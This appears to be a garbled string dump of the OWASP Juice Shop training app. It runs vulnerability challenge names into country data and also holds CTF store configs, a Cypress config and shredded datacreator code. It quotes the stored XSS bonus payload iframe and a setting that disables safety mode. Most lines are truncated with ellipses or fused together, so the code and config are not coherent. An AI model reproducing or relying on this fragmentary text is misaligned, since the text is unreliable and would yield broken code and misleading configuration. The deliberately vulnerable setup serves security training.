of)KPname: K ... lic of)redirectCryptoCurrencyChallengeredirec ... allengeKoreaKRname: KorearedirectChallengeBelarusBYname: BelarusbasketAccessChallengebasketA ... allengeBoliviaBOname: BolivianegativeOrderChallengenegativ ... allengeSwitzerlandCHname: SwitzerlanddirectoryListingChallengedirecto ... allengePeruPEname: PeruforgottenDevBackupChallengeforgott ... allengeUkraineUAname: UkraineforgottenBackupChallengeUnited States of AmericaUnited  ... AmericaUSname: U ... AmericaadminSectionChallengeadminSe ... allengeTurkeyTRname: TurkeychangePasswordBenderChallengechangeP ... allengeSurinameSRname: SurinamechangeProductChallengeColombiaCOname: ColombiaknownVulnerableComponentChallengeknownVu ... allengePolandPLname: PolandweirdCryptoChallengeEcuadorECname: EcuadoreasterEggLevelOneChallengeeasterE ... allengeSri LankaLKname: Sri LankaeasterEggLevelTwoChallengeEritreaERname: EritreaforgedCouponChallengeforgedC ... allengePanamaPAname: PanamachristmasSpecialChallengechristm ... allengeFalkland Islands (Malvinas)Falklan ... lvinas)FKname: F ... lvinas)uploadSizeChallengeFrench GuianaGFname: French GuianauploadTypeChallengeSaudi ArabiaSAname: Saudi ArabiafileWriteChallengeIranIRname: IranextraLanguageChallengeextraLa ... allengeAustraliaAUname: AustraliacaptchaBypassChallengecaptcha ... allengeCte d'IvoireC\u00f4te d'IvoireCIname: C\u00f4te d'IvoirezeroStarsChallengeArgentinaARname: ArgentinacontinueCodeChallengecontinu ... allengeMalaysiaMYname: MalaysiaoauthUserPasswordChallengeoauthUs ... allengeSouth SudanSSname: South SudanloginSupportChallengeloginSu ... allengeCroatiaHRname: CroatialoginRapperChallengeAlbaniaALname: AlbaniapremiumPaywallChallengepremium ... allengeAlgeriaDZname: AlgeriaresetPasswordJimChallengeresetPa ... allengeDominican RepublicDOname: D ... epublicresetPasswordBenderChallengeMoldovaMDname: MoldovaresetPasswordMortyChallengeCzech RepublicCZname: Czech RepublicresetPasswordBjoernChallengeGeorgiaGEname: GeorgianoSqlCommandChallengenoSqlCo ... allengeTrinidad and TobagoTTname: T ...  TobagonoSqlReviewsChallengenoSqlRe ... allengeUnited Arab EmiratesAEname: U ... miratesnoSqlOrdersChallengeEstoniaEEname: EstoniaretrieveBlueprintChallengeretriev ... allengeVenezuelaVEname: VenezuelatyposquattingNpmChallengetyposqu ... allengeNicaraguaNIname: NicaraguatyposquattingAngularChallengeSenegalSNname: SenegaljwtUnsignedChallengeNew ZealandNZname: New ZealandjwtForgedChallengeMongoliaMNname: MongoliamisplacedSignatureFileChallengemisplac ... allengeNepalNPname: NepaldeprecatedInterfaceChallengedepreca ... allengeMoroccoMAname: MoroccoxxeFileDisclosureChallengexxeFile ... allengeIraqIQname: IraqxxeDosChallengeChinaname: ChinarceChallengeBrazilBRname: BrazilrceOccupyChallengeIndiaINname: IndiatokenSaleChallengeUnited KingdomGBname: United KingdomsecurityPolicyChallengesecurit ... allengeSpainESname: SpainhiddenImageChallengeLithuaniaLTname: LithuaniasupplyChainAttackChallengesupplyC ... allengeTogoTGname: TogotimingAttackChallengetimingA ... allengeEgyptEGname: EgyptbasketManipulateChallengebasketM ... allengeBhutanBTname: BhutanemailLeakChallengeBahamasBHname: BahamasregisterAdminChallengeregiste ... allengeJamaicaJAname: JamaicahttpHeaderXssChallengehttpHea ... allengePuerto RicoPRname: Puerto RicosstiChallengeIndonesiaIDname: IndonesiassrfChallengeThailandTHname: ThailandloginAmyChallengeAndorraADname: AndorrausernameXssChallengeAzerbaijanAZname: AzerbaijanresetPasswordBjoernOwaspChallengeKazakhstanKZname: KazakhstanaccessLogDisclosureChallengeaccessL ... allengeSingaporeSGname: SingaporedlpPasswordSprayingChallengedlpPass ... allengeChadTDname: ChaddlpPastebinDataLeakChallengedlpPast ... allengeTurkmenistanTKname: TurkmenistanvideoXssChallengePakistanPKname: PakistantwoFactorAuthUnsafeSecretStorageChallengetwoFact ... allengeSwedenSEname: SwedenmanipulateClockChallengemanipul ... allengeVatican CityVCname: Vatican CityprivacyPolicyChallengeprivacy ... allengeCameroonCMname: CameroonprivacyPolicyProofChallengeNamibiaNAname: NamibiapasswordRepeatChallengepasswor ... allengeGuyanaGYname: GuyanadataExportChallengeCambodiaCBname: CambodiaghostLoginChallengeTaiwanTWname: TaiwandbSchemaChallengeBruneiBNname: BruneiephemeralAccountantChallengeephemer ... allengeDenmarkDKname: DenmarkmissingEncodingChallengemissing ... allengeArmeniaAMname: ArmeniasvgInjectionChallengesvgInje ... allengeTunisiaTNname: TunisiaexposedMetricsChallengeexposed ... allengeJapanJPname: JapanfreeDeluxeChallengeVietnamVNname: VietnamcsrfChallengeLuxembourgLUname: LuxembourgxssBonusChallengeEthiopiaETname: EthiopiaresetPasswordUvoginChallengeRepublic of South AfricaRepubli ...  AfricaRSAname: R ...  AfricageoStalkingMetaChallengegeoStal ... allengeBelgiumBEname: BelgiumgeoStalkingVisualChallengeThe NetherlandsNLname: T ... erlandskillChatbotChallengeCzechoslovakiaCSKname: CzechoslovakianullByteChallengeBurundiBIname: BurundibullyChatbotChallengebullyCh ... allengeGuamGUname: GuamlfrChallengeIrelandIEname: IrelandcloseNotificationsChallengecloseNo ... allengeZambiaZMname: ZambiaemptyUserRegistrationemptyUs ... trationKenyaKEname: KenyanftUnlockChallengeAfghanistanAFname: AfghanistannftMintChallengeUAEweb3WalletChallengeMexicoMEXname: Mexicoweb3SandboxChallengeFranceFRname: FrancecsafChallengeSloveniaSIname: SloveniascoreBoardChallenge:P:/My Drive/Git/juice-shop/config/juicebox.ymljuice-b.oxOWASP Juice Box'OWASP Juice Box'juiceboxBoxy'Boxy'name: 'Boxy'domain: juice-b.ox<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/321927177&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>juicyEvilWasp.pngavatarI ... asp.pngP:/My Drive/Git/juice-shop/config/mozilla.ymlmozilla-ctf.opMozilla CTF'Mozilla CTF'https://github.com/mozilla/ctf-austin/raw/master/app/public/images/MozillaCTF.png'https: ... TF.png'https://github.com/mozilla/ctf-austin/raw/master/app/public/favicon_v2.ico'https: ... v2.ico'deeporange-indigoMozquitodonotreply@mozilla-ctf.op'donotr ... ctf.op'mozctfFoxy'Foxy'https://upload.wikimedia.org/wikipedia/commons/9/9f/Fennec_Fox_Vulpes_zerda.jpg'https: ... da.jpg'name: 'Foxy'https://twitter.com/mozcloudsec'https: ... oudsec'https://blog.mozilla.org/press/kits'https: ... s/kits'twitter ... oudsec'Gear-200155340.jpgGear-200155753.jpgtopProd ... 340.jpgThis website uses a myriad of 3rd-party cookies for your convenience and tracking pleasure.'This w ... asure.'Never mind!'Never mind!'How can I turn this off?'How ca ... s off?'https://support.mozilla.org/en-US/kb/disable-third-party-cookies'https: ... ookies'message ... asure.'mailto:donotreply@mozilla-ctf.op'mailto ... ctf.op'contact ... ctf.op'domain: ... -ctf.opnever<iframe width="560" height="315" src="https://www.youtube.com/embed/0u9g0LhRkGk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>Champion Sweatshirt with a Drawstring Tote'Champi ... g Tote'68.89https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155415.jpg'https: ... 15.jpg'name: ' ... g Tote'Rickshaw Commuter 2.0 Laptop Bag'Ricksh ... op Bag'205https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155749.jpg'https: ... 49.jpg'name: ' ... op Bag'Moleskine Notebook'Moleskine Notebook'33https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155752.jpg'https: ... 52.jpg'name: ' ... tebook'Special Package 1'Special Package 1'This Very Splendid Package includes a ladies navy t-shirt (not shown), a baseball cap, and a coffee mug in a drawstring tote.'This V ...  tote.'34https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200157452.jpgname: ' ... kage 1'Special Package 2'Special Package 2'This Very Splendid Package includes a unisex navy t-shirt, a baseball cap, and a coffee mug in a drawstring tote.37https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200157454.jpg'https: ... 54.jpg'name: ' ... kage 2'Special Package 3'Special Package 3'The Most Splendid Package includes a Champion sweatshirt in a drawstring tote, a Moleskine notebook, and a Rickshaw Commuter 2.0 Laptop Bag.'The Mo ... p Bag.'300.89https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200157451.jpg'https: ... 51.jpg'name: ' ... kage 3'Unisex t-shirt, navy'Unisex ... , navy'13.51https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155342.jpg'https: ... 42.jpg'name: ' ... , navy'Ladies t-shirt, navy'Ladies ... , navy'https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155413.jpg'https: ... 13.jpg'Unisex t-shirt, lapis'Unisex ...  lapis'https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-unisex-t-shirt-lapis.jpg'https: ... is.jpg'name: ' ...  lapis'Black cap w/tote'Black cap w/tote'17.75https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155339.jpg'https: ... 39.jpg'name: ' ... w/tote'Beanie5.5https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155340.jpg'https: ... 40.jpg'One of my favorites.'One of ... rites.'name: BeanieDrawstring tote'Drawstring tote'https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155751.jpgname: ' ... g tote'Glossy finish ceramic mug'Glossy ... ic mug'8.81https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155758.jpg'https: ... 58.jpg'name: ' ... ic mug'3 inch round Firefox sticker, individual'3 inch ... vidual'0.111 roll = 500 stickers (please request 500 if you need a full roll)'1 roll ...  roll)'https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155753.jpg'https: ... 53.jpg'name: ' ... vidual'Silicone wristband'Silicone wristband'0.32https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155756.jpg'https: ... 56.jpg'name: ' ... stband'Vertical laminated conference badge'Vertic ...  badge'2.33https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155755.jpg'https: ... 55.jpg'name: ' ...  badge'Mozilla lanyard with bulldog clip'Mozill ... g clip'1.65https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155754.jpgname: ' ... g clip'Firefox tattoo, 50 pack'Firefo ... 0 pack'https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/Gear-200155757.jpg'https: ... 57.jpg'name: ' ... 0 pack'1.25 inch Firefox Button, 25 pack'1.25 i ... 5 pack'name: ' ... 5 pack'Mozilla Cap'Mozilla Cap'4.63name: 'Mozilla Cap'Colour Contrast Analyser Firefox Extension'Colour ... ension'The Colour Contrast Analyser Firefox extension lists colour combinations used in the document in a table that summarises the foreground colour, background colour, luminosity contrast ratio, and the colour difference and brightness difference used in the algorithm suggested in the 26th of April 2000 working draft for Accessibility Evaluation and Repair Tools (AERT). Each element is also listed with its parent elements, and class and id attribute values when specified to make it easier to locate the elements. <br/><span style="color:red;">This extension has been removed because side-effects with other plugins.</span>'The Co ... /span>'http://juicystudio.com/img/logo.gif'http:/ ... go.gif'juicenotemagische firefox suchemagisch ... x suche- juicenotename: ' ... ension'Fox Plush'Fox Plush'8.6name: 'Fox Plush'Mozilla custom hoodie'Mozill ... hoodie'19.66You gotta get this.'You go ...  this.'name: ' ... hoodie'Woman's Firefox Logo T-Shirt (grey)'Woman' ... (grey)'4.31name: ' ... (grey)'Women's Vertical T-Shirt'Women' ... -Shirt'5.09Mozilla Horizontal T-Shirt'Mozill ... -Shirt'5.94OWASP Zed Attack Proxy (ZAP)'OWASP  ...  (ZAP)'ZAP is one of the worlds most popular free security tools and can help you automatically find security vulnerabilities while you are developing and testing your applications.'ZAP is ... tions.'zap.pnghttps://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project'https: ... roject'name: ' ...  (ZAP)'Contains a random selection of stickers and three Unisex t-shirts (3XL) for an unbeatable price!Mozilla Austin CTF Logo (3D-printed)'Mozill ... inted)'https://github.com/mozilla/ctf-austin/raw/master/app/public/images/products/3d_keychain.stl'https: ... in.stl'P:/My Drive/Git/juice-shop/config/oss.ymlOpenSecuritySummit Store'OpenSe ...  Store'https://open-security-summit.org/img/logo.pnghttps:/ ... ogo.pngWe are not only using cookies but also recorded this session on YouTube!'We are ... uTube!'I've been there live, so thanks!"I've b ... hanks!"I want to watch that!'I want ...  that!'https://youtu.be/WtY712DdlR8?t=413'https: ... ?t=413'message ... uTube!'Dinis'Dinis'https://pbs.twimg.com/profile_images/552850030105591808/x3i7zK5r_400x400.jpeg'https: ... 0.jpeg'name: 'Dinis'https://twitter.com/opensecsummit'https: ... summit'https://join.slack.com/t/os-summit/shared_invite/zt-eptzb479-POZlYeYI1vaNNZzVatF2ag'https: ... atF2ag'twitter ... summit'oss2020-lockdo.wndonotreply@oss2020-lockdo.wndonotre ... ckdo.wnhttps://open-security-summit.org/img/favicon.icohttps:/ ... con.icoOssyCoinoss2020planttreev1_280x420.jpgplanttr ... 420.jpgtopProd ... 420.jpgname: ' ...  Store'https://www.juicesummit.org/'https: ... t.org/'showSol ... : falsehttps://s3.amazonaws.com/heysummit-production/media/thumbnails/defaults/user_default_image_square_large.png'https: ... ge.png'avatarI ... ge.png'OSS2020 - Lockdown Edition Enamel Mug'OSS202 ... el Mug'Every happy camper needs a unique camper mug. It's lightweight, durable and multifunctional. Use it for your favorite beverage or a hot meal, and attach it to your bag for easy access on a hike."Every  ...  hike."https://cdn.shopify.com/s/files/1/0276/0474/6320/products/mockup-c4c074da_280x420.jpg?v=1590062996'https: ... 062996'name: ' ... el Mug'OSS2020 - Juice Shop Track Sticker'OSS202 ... ticker'1.80These stickers are printed on durable, high opacity adhesive vinyl which makes them perfect for regular use, as well as for covering other stickers or paint. The high-quality vinyl ensures there are no bubbles when applying the stickers."These  ... ckers."https://cdn.shopify.com/s/files/1/0276/0474/6320/products/mockup-306c4dc0_280x420.jpg?v=1591012423'https: ... 012423'This is the juiciest decal for my space ship!'This i ...  ship!'OSS2020 - Facemask / Headband / Bandana'OSS202 ... andana'This neck gaiter is a versatile accessory that can be used as a face covering, headband, bandana, wristband, and neck warmer. Upgrade your accessory game and find a matching face shield for each of your outfits."This n ... tfits."https://cdn.shopify.com/s/files/1/0276/0474/6320/products/mockup-a2bdf6ac_280x420.jpg?v=1590055729'https: ... 055729'name: ' ... andana'OSS2020 - Aluminium Bottle'OSS202 ... Bottle'https://cdn.shopify.com/s/files/1/0276/0474/6320/products/tyr-industries-White1591704017_280x420.png?v=1591704032'https: ... 704032'name: ' ... Bottle'Juice Summit 2021 Ticket'Juice  ... Ticket'599SAVE THE DATE FOR THE 2021 EDITION OF THE SUMMIT, ON OCTOBER 7 & 8 AT THE SAME LOCATION  HILTON ANTWERP HOTEL 4* IN ANTWERP, BELGIUM.'SAVE T ... LGIUM.'https://www.juicesummit.org/wp-content/themes/juicesummit/img/header-logo.png?V=2019'https: ... V=2019'Juicy!!!'Juicy!!!'Dedicate a tree to the Open Security Summit'Dedica ... Summit'Plant a tree for the Open Security Summit and reduce our carbon footprint!'Plant  ... print!'https://cdn.shopify.com/s/files/1/0276/0474/6320/products/planttreev1_280x420.jpg?v=1590537226'https: ... 537226'Humans are all puny tree huggers!'Humans ... ggers!'name: ' ... Summit'Open Security Summit 2020 Ticket'Open S ... Ticket'Get your official ticket!'Get yo ... icket!'50https://2019.open-security-summit.org/img/blocks/ticket.pnghttps:/ ... ket.pnghttps://open-security-summit-2020.heysummit.com/checkout/select-tickets/'https: ... ckets/'ASEAN CSA and OWASP Summit 2014 Ticket'ASEAN  ... Ticket'The ASEAN CSA and OWASP Summit 2014 will be the ASEAN industrys event for IT security professionals and executives who must further educate themselves on the rapidly evolving subject of cloud security. In addition, to offer best practices and practical solutions for the security in clouds, ASEAN CSA and OWASP Summit will focus on emerging areas of growth and concern in cloud security, including research & development, standardization and policies. Stepping up from the security in cloud infrastructure, the summit will also discuss about security of Anything as a Service (XaaS) that are available in the real world. Additionally, for those who develop their own applications running on the cloud, application security experts will shares the key factors to make application secured.'The AS ... cured.'399.99https://scontent-ham3-1.xx.fbcdn.net/v/t31.0-8/p960x960/16252385_1242375352521741_5387610698864437018_o.png?_nc_cat=102&_nc_sid=85a577&_nc_ohc=7VkZI-XvzkEAX_UDcOp&_nc_ht=scontent-ham3-1.xx&oh=b6e91cb5afbf2514ea123bde620a439c&oe=5F0B4065'https: ... 0B4065'https://user-images.githubusercontent.com/15072044/41160171-c2619674-6b26-11e8-9c3e-848f6b2d9d0f.jpg'https: ... 0f.jpg'The table is long because of the community'The ta ... munity'image:  ... 0f.jpg'https://user-images.githubusercontent.com/15072044/41163238-0ac8184e-6b30-11e8-9e84-25433de7accc.jpg'https: ... cc.jpg'Into the zone!'Into the zone!'image:  ... cc.jpg'https://user-images.githubusercontent.com/15072044/41160165-c1f285b8-6b26-11e8-848b-8b15c3c35f94.jpg'https: ... 94.jpg'My burger will be like this!'My bur ...  this!'jannikimage:  ... 94.jpg'https://user-images.githubusercontent.com/15072044/41010154-be17a162-692d-11e8-84f8-3cb855ae473d.jpg'https: ... 3d.jpg'Security'Security'image:  ... 3d.jpg'P:/My Drive/Git/juice-shop/config/quiet.ymlquestio ... l: nullshowGit ... : falseP:/My Drive/Git/juice-shop/config/test.ymlP:/My Drive/Git/juice-shop/config/tutorial.ymlrestric ... t: truechallenges:P:/My Drive/Git/juice-shop/config/unsafe.ymlsafetyMode: disabledP:/My Drive/Git/juice-shop/config.schema.ymltype: numbertype: stringport:type: booleanname:twitterUrl:topProductImage:showOnFirstStart:message:contact:video:uri:- uri:clientId:domain:'enabled''disabled''auto'['enabl ... 'auto']showSol ... ations:isEnabled:- type: stringtext:- text:- name:image:- image:showFla ... ations:P:/My Drive/Git/juice-shop/crowdin.yaml[ci skip]
Signed-off-by: Bjrn Kimminich <bjoern.kimminich@gmx.de>|-/frontend/src/assets/i18n/en.json/fronte ... en.jsontranslation/frontend/src/assets/i18n/%locale_with_underscore%.json/fronte ... e%.jsonsource: ... en.json/data/static/i18n/en.json/data/s ... en.json/data/static/i18n/%locale_with_underscore%.json/data/s ... e%.json- sourc ... en.jsoncommit_message: |-P:/My Drive/Git/juice-shop/cypress.config.ts TODO Remove after upgrade to Cypress >=12.5.0 <or> Chrome 119 become available on GitHub Workflows, see https://github.com/cypress-io/cypress-documentation/issues/5479// TODO ... es/5479defineConfig'cypress'assecurity'./lib/insecurity''config'MemoryMemoryConfigProductProductConfig'./lib/config.types'utils'./lib/utils'otplib'otplib'exportprojectId'3hrkhu'defaultCommandTimeout10000'http://localhost:3000'specPattern'test/cypress/e2e/**.spec.ts'downloadsFolder'test/cypress/downloads'fixturesFoldersupportFile'test/cypress/support/e2e.ts'setupNodeEvents'before:browser:launch'launchOptions'chrome'&&isHeadless'--headless''--headless=new''task'GenerateCoupondiscountgenerateCouponGetBlueprint<'products'blueprintGetChristmasProductGetCouponIntent`data/chatbot/${extractFilename'application.chatBot.trainingData'}`couponIntentintent'queries.couponCode'GetFromMemories'memories'GetFromConfigvariableGetOverwriteUrl'challenges.overwriteUrlForProductTamperingChallenge'GetPastebinLeakProductGetTamperingProductIdlet++GenerateAuthenticatorinputStringauthenticatorgeneratetoISO8601newisDockerisWindowsimport  ... ypress'cypressimport  ... curity'./lib/insecurity/lib/insecurity* as securityimport  ... config'import  ... .types'./lib/config.types/lib/configMemory  ... yConfigProduct ... tConfigimport  ... /utils'./lib/utils/lib/utils* as utilsimport  ... otplib'* as otplibexport  ...   }\r\n})defineC ...   }\r\n}){\r\n  pr ... \n  }\r\n}projectId: '3hrkhu'3hrkhudefault ... : 10000default ... Timeoute2e: {\r ...  }\r\n  }baseUrl ... t:3000'specPat ... pec.ts''test/c ... pec.ts'test/cypress/e2e/**.spec.tsdownloa ... nloads''test/c ... nloads'test/cypress/downloadsfixture ... : falsesupport ... e2e.ts''test/c ... e2e.ts'test/cypress/support/e2e.tstest/cypress/support/e2esetupNo ... \r\n    }on('bef ...      })'before ... launch'before:browser:launch(browse ...       }{ // TO ...       }if (bro ...       }browser ... eadlessbrowser ... chrome'browser.namebrowser.isHeadlesslaunchO ...      })launchOptions.argslaunchO ... rgs.map(arg: a ...       }if (arg ...       }arg === '--headless'--headlessreturn  ... ss=new'--headless=newreturn argreturn launchOptionson('tas ...      })taskGenerat ...       }return  ... scount)securit ... scount)securit ... eCouponGetBlue ...       }for (co ...       }config. ... ducts')config.getProductConfig[]const productif (pro ...       }product ... allengeconst b ... allengebluepri ... allengereturn blueprintGetChri ...       }return  ...    )[0]config. ...    )[0]config. ...       )config. ... .filter(produc ... allengeGetCoup ...       }const t ...    )}`)trainin ...    )}`)require ...    )}`)`data/c ...     )}`utils.e ...       )utils.e ... ilenameconfig. ... gData')'applic ... ngData'application.chatBot.trainingDataconst c ...    )[0]couponI ...    )[0]trainin ...    )[0]trainin ...       )trainin ... .filtertrainingData.data(data:  ... onCode'{ intent: string }intent: stringdata.in ... onCode'data.intentqueries.couponCodereturn couponIntentGetFrom ...       }config. ...  as anyconfig. ... ories')MemoryConfig[]const memoryif (mem ...       }memory[property]return  ... operty]return  ... riable)config.get(variable)GetOver ...       }return  ... lenge')config. ... lenge')'challe ... llenge'challenges.overwriteUrlForProductTamperingChallengeGetPast ...       }GetPast ... ProductGetTamp ...       }GetTamp ... oductIdconst p ... ducts')product ... ducts')for (le ...       }i < products.lengthproducts.lengthi++let i = 0i = 0products[i]return i + 1i + 1Generat ... ticatorreturn  ... String)otplib. ... String)otplib. ... enerateotplib.authenticatortoISO86 ...       }const d ...  Date()date = new Date()new Date()return  ... 1(date)utils.t ... 1(date)utils.toISO8601isDocke ...       }return  ... ocker()utils.isDocker()utils.isDockerisWindo ...       }return  ... ndows()utils.isWindows()utils.isWindowsP:/My Drive/Git/juice-shop/data/datacache.tsP:/My Drive/Git/juice-shop/data jslint node: true /* jsli ... true */BasketItemModel'models/basketitem'ChallengeModel'models/challenge'ComplaintModel'models/complaint'FeedbackModel'models/feedback'ProductModel'models/product'BasketModel'models/basket'UserModel'models/user'RecordusersfeedbackbasketsbasketItemscomplaintschallengeisRestorenotificationsretrieveBlueprintChallengeFilesetRetrieveBlueprintChallengeFileretrieveBlueprintChallengeFileArgimport  ... etitem'models/basketitemimport  ... llenge'models/challengeimport  ... plaint'models/complaintimport  ... edback'models/feedbackimport  ... roduct'models/productimport  ... basket'models/basketimport  ... s/user'models/userexport  ... l> = {}const c ... l> = {}challen ... l> = {}Record< ... eModel>const u ... l> = {}users:  ... l> = {}Record< ... rModel>const p ... l> = {}product ... l> = {}Record< ... tModel>const f ... l> = {}feedbac ... l> = {}Record< ... kModel>const b ... l> = {}baskets ... l> = {}basketI ... l> = {}Record< ... mModel>complai ... l> = {}export  ... lean\r\n}interfa ... lean\r\n}key: stringname: stringchallenge: stringflag: stringhidden: booleanisRestore: booleanexport  ... [] = []const n ... [] = []notific ... [] = [][]Notification[]export  ...  = nulllet ret ...  = nullretriev ...  = nullretriev ... ngeFilestring | nullexport  ... eArg\r\n}functio ... eArg\r\n}setRetr ... ngeFileretriev ... FileArg{\r\n  re ... eArg\r\n}P:/My Drive/Git/juice-shop/data/datacreator.ts todo(@J12934) change this to use a proper challenge model or something// todo ... mething eslint-disable-next-line @typescript-eslint/consistent-type-assertions// esli ... ertions todo(@J12934) currently missing the 'not available' text. Needs changes to the model and utils functions// todo ... nctions set default image values// set  ...  values add Challenge specific information// add  ... rmation TODO Rename into "isDeleted" or "deletedFlag" in config for v14.x release// TODO ... releaseAddressModel'../models/address''../models/basket''../models/basketitem'CardModel'../models/card''../models/challenge''../models/complaint'DeliveryModel'../models/delivery''../models/feedback'MemoryModel'../models/memory''../models/product'QuantityModel'../models/quantity'RecycleModel'../models/recycle'SecurityAnswerModel'../models/securityAnswer'SecurityQuestionModel'../models/securityQuestion''../models/user'WalletModel'../models/wallet''./types'logger'../lib/logger''../lib/config.types''../lib/utils'StaticUserStaticUserAddressStaticUserCard'./staticData'loadStaticChallengeDataloadStaticDeliveryDataloadStaticUserDataloadStaticSecurityQuestionsDataordersCollectionreviewsCollection'./mongodb'AllHtmlEntitiesEntities'html-entities'datacache'./datacache''../lib/insecurity''replace'creatorscreateSecurityQuestionscreateUserscreateChallengescreateRandomFakeUserscreateProductscreateBasketscreateBasketItemscreateAnonymousFeedbackcreateComplaintscreateRecycleItemcreateOrderscreateQuantitycreateWalletcreateDeliveryMethodscreateMemoriesprepareFilesystemcreator'challenges.showHints''challenges.showMitigations'difficultyhintUrlmitigationUrldisabledEnvtutorialisChallengeEnableddisabledBecausegetChallengeEnablementStatus?.';'??'juice-sh.op''application.domain''&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; allow=&quot;autoplay&quot; src=&quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&amp;color=%23ff5500&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&quot;&gt;&lt;/iframe&gt;''challenges.xssBonusPayload'/OWASP Juice Shop's/`${'application.name'}'s`try!=','' <em>(This challenge is <strong>potentially harmful</strong> on ''!)</em>'tutorialOrdercodingChallengeStatus`Could not insert Challenge ${}: ${getErrorMessageemailcustomDomainroledeletedFlagprofileImagesecurityQuestioncardtotpSecretlastLoginIpcompleteEmail}@${deluxeTokenrolesdeluxe`assets/public/images/uploads/${'defaultAdmin.png''default.svg'createSecurityAnsweranswercreateFeedbackcommentratingdeleteUsercreateAddressescreateCards`Could not insert User ${UserIdbalancewalletBalanceunknown`Could not create wallet: ${deliverieseta`Could not insert Delivery Method: ${addressescountryfullNamemobileNumzipCodestreetAddresscity`Could not create address: ${cardscardNumexpMonthexpYear`Could not create card: ${userIdwhere`Could not perform soft delete for the user ${deleteProductproductId`Could not perform soft delete for the product ${getGeneratedRandomFakeUserEmailrandomDomainmakeRandomString'.''@'possible'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'+='application.numberOfRandomFakeUsers'ProductId70`Could not create quantity: ${imagePath'assets/public/images/uploads/-#zatschi-#whoneedsfourlegs-1572600969477.jpg'' #zatschi #whoneedsfourlegs'`Could not create memory: ${structuredClonetmpImageFileNameisUrlimageUrldownloadToFile'frontend/dist/frontend/assets/public/images/uploads/'john'john'emma'emma'!`Could not find user for memory ${}!`userIdOfMemory`Could not find saved user for memory ${'assets/public/images/uploads/''Lorem ipsum dolor sit amet, consectetuer adipiscing elit.''undefined.png''frontend/dist/frontend/assets/public/images/products/'christmasChallengeProductpastebinLeakChallengeProducttamperingChallengeProductblueprintRetrievalChallengeProduct' (Seasonal special offer! Limited availability!)''2014-12-27 00:00:00.000 +00:00'' <a href="''" target="_blank">More...</a>'' (This product is unsafe! We plan to remove it from the stock!)''2019-02-1 00:00:00.000 +00:00'blueprintUrl`Could not insert Product ${persistedProductchristmasSpecialosaftcustomizeChangeProductChallenge!==customizeRetrieveBlueprintChallengeelse'No persisted product found!'insertlikesCountlikedBy`Could not insert Product Review ${customUrlcustomProductcustomDescription/OWASP SSL Advanced Forensic Tool \(O-Saft\)/g'https://owasp.slack.com'/OWASP Juice Shop Logo \(3D-printed\)/gbasket`Could not insert Basket for UserId ${BasketIdbasketItem`Could not insert BasketItem for BasketId ${feedbacks'Incompetent customer support! Can\'t even upload photo of broken purchase!<br><em>Support Team: Sorry, only order confirmation PDFs can be attached to complaints!</em>''This is <b>the</b> store for awesome stuff of all kinds!''Never gonna buy anywhere else from now on! Thanks for the great service!''Keep up the good work!'authoredComment} (***${})`} (anonymous)``Could not insert Feedback ${} mapped to UserId ${'I\'ll build my own eCommerce business! With Black Jack! And Hookers!'`Could not insert Complaint: ${recycles800AddressId'2270-01-17'isPickup1320'2006-01-14'120'2018-04-16''2018-01-17'350'2018-03-17'200'2018-07-17'140'2018-03-19'150'2018-05-12'500'2019-02-18'recyclecreateRecycle`Could not insert Recycling Model: ${questions`Could not insert SecurityQuestion ${SecurityQuestionId`Could not insert SecurityAnswer ${basket1Productsbonusbasket2Productsbasket3ProductsadminEmail'admin@'ordersorderId'-'randomHexString/[aeiou]/gitotalPricedelivered'0''demo''d*m*'`Could not insert Order ${replacement'server.baseUrl''.well-known/csaf/provider-metadata.json'import  ... ddress'../models/address/models/address../models/basket/models/basket'../mod ... etitem'../models/basketitem/models/basketitemimport  ... s/card'../models/card/models/card'../mod ... llenge'../models/challenge/models/challenge'../mod ... plaint'../models/complaint/models/complaintimport  ... livery'../models/delivery/models/delivery../models/feedback/models/feedbackimport  ... memory'../models/memory/models/memory../models/product/models/productimport  ... antity'../models/quantity/models/quantityimport  ... ecycle'../models/recycle/models/recycleimport  ... Answer''../mod ... Answer'../models/securityAnswer/models/securityAnswerimport  ... estion''../mod ... estion'../models/securityQuestion/models/securityQuestionSecurit ... onModel../models/user/models/userimport  ... wallet'../models/wallet/models/walletimport  ... /types'./types/typestype Productimport  ... logger'../lib/logger/lib/logger'../lib ... .types'../lib/config.types../lib/utilsimport  ... icData'./staticData/staticDataloadSta ... ngeDataloadSta ... eryDataloadSta ... onsDataimport  ... ongodb'./mongodb/mongodbimport  ... tities'html-entitiesAllHtml ... ntitiesimport  ... acache'./datacache/datacache* as datacache../lib/insecurityconst r ... place')replace ... place')require('replace')const e ... ities()entitie ... ities()new Entities()export  ... \n  }\r\n}async ( ... \n  